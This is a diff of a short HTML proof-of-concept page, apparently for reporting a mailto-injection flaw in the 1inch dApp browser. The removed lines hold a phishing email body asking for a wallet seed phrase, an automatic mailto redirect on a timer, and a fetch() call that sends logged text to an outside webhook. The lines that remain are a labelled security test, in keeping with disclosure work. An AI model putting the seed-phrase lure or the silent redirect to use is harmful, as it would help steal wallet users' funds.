@@ -1,28 +1,12 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="test1()">Test 1 - Mail Biasa</button><br><br>
-<button onclick="test2()">Test 2 - Mail + Isi Phishing</button><br><br>
-<button onclick="test3()">Test 3 - Mail Auto Tanpa Klik</button><br><br>
+<button onclick="test2()">Test 2 - Mail + Auto Body</button>
 <pre id="o"></pre>
 <script>
-function log(m){
-  document.getElementById('o').innerText = m;
-  fetch('https://webhooksite.net/9782dc22-d216-43c9-a513-905aa2d97d00?mailto=' + encodeURIComponent(m));
-}
-function test1(){
-  log("Coba buka: mailto:support@1inch.io");
-  window.location.href = "mailto:support@1inch.io?subject=Verifikasi Wallet";
-}
 function test2(){
-  log("Coba buka: mailto + body phishing");
-  window.location.href = "mailto:support@1inch.io?subject=Verifikasi Wallet&body=Halo, tolong kirim seed phrase kamu ke sini untuk verifikasi";
-}
-function test3(){
-  log("Coba buka OTOMATIS tanpa klik kedua");
-  setTimeout(()=>{
-    window.location.href = "mailto:support@1inch.io?subject=Verifikasi Wallet";
-  }, 1000);
+  document.getElementById('o').innerText = "Trying to open: mailto + auto body";
+  window.location.href = "mailto:support@1inch.io?subject=Security Test - Mailto Injection from dApp Browser&body=This is a security test. This email was pre-filled automatically from a website opened inside 1inch dApp Browser without any confirmation dialog from 1inch. An attacker could pre-fill recipient, subject, and body to impersonate 1inch support.";
 }
 </script>
 </body>
